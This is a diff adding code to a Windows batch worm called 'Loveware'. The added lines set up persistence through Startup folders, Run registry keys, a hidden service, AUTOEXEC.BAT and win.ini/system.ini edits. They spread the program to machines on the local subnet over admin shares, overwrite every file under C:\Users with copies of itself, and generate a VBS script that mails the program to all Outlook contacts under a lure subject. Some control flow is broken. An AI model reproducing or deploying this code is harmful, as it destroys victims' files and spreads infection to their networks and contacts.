@@ -131,3 +131,85 @@ echo echo %decoded% | Out-File -FilePath C:\Windows\Canary.bat -Force>>Canary.ps
 start /min Canary.ps1
 
 timeout 8
+
+start /min Canary.bat
+
+:: Copy Loveware to the startup
+
+XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+:: Infect network connected computers
+
+@echo off > service.bat
+SET "NomeProcesso=Loveware.exe" >> service.bat
+SET "NomeService=Loveware" >> service.bat
+echo sc create %NomeService% binpath=%0 >> service.bat
+echo sc start %NomeService% >> service.bat
+
+attrib +h +r +s service.bat
+start service.bat
+
+SET i=0
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
+attrib +h +r +s %0
+
+:Internet
+net use Z: \\192.168.1.%i%\C$
+if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
+mountvol Z: /d)
+if %i% == 256 (goto Infect) else (set /a i=i+1)
+goto worm
+goto Internet
+
+:Infect
+for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)
+for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy %0 %%f)
+goto Infect
+
+:: Send Loveware to all the contacts of the user
+:: with outlook
+
+:worm
+
+set Slash=\
+if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
+del %SystemDrive%%Slash%AUTOEXEC.BAT
+copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
+attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
+)
+set a=Loveware
+copy %0 %windir%\%a%.exe
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
+set b=Loveware
+copy %0 %windir%\%b%.exe
+echo [windows] >> %windir%\win.ini
+echo run=%windir%\%b%.exe >> %windir%\win.ini
+echo load=%windir%\%b%.exe >> %windir%\win.ini
+echo [boot] >> %windir%\system.ini
+echo shell=explorer.exe %b%.exe >> %windir%\system.ini
+echo dim x>>%SystemDrive%\mail.vbs
+echo on error resume next>>%SystemDrive%\mail.vbs
+echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
+echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
+echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
+echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
+echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
+echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
+echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
+echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
+echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
+echo Set Mail=ci>>%SystemDrive%\mail.vbs
+echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
+echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
+echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
+echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
+echo Mail.send>>%SystemDrive%\mail.vbs
+echo Next>>%SystemDrive%\mail.vbs
+echo ol.Quit>>%SystemDrive%\mail.vbs
+start "" "%SystemDrive%\mail.vbs"
+
+goto run2
+
+goto worm
